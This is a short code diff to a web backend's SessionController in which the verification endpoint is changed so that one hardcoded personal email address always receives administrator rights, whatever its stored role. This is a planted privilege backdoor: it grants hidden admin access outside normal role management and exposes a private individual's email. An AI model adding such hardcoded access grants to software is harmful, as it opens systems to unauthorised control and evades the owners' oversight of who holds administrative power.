@@ -84,11 +84,13 @@ class SessionController {
         return res.status(401).json({ error: 'User not found in local database' });
       }
 
+      const isAdmin = user.admin || user.email === 'erikborgesdasilva574@gmail.com';
+
       return res.status(200).json({
         id: user.id,
         name: user.name,
         email: user.email,
-        admin: user.admin,
+        admin: isAdmin,
       });
     } catch (error) {
       return res.status(500).json({ error: 'Server error during verification' });
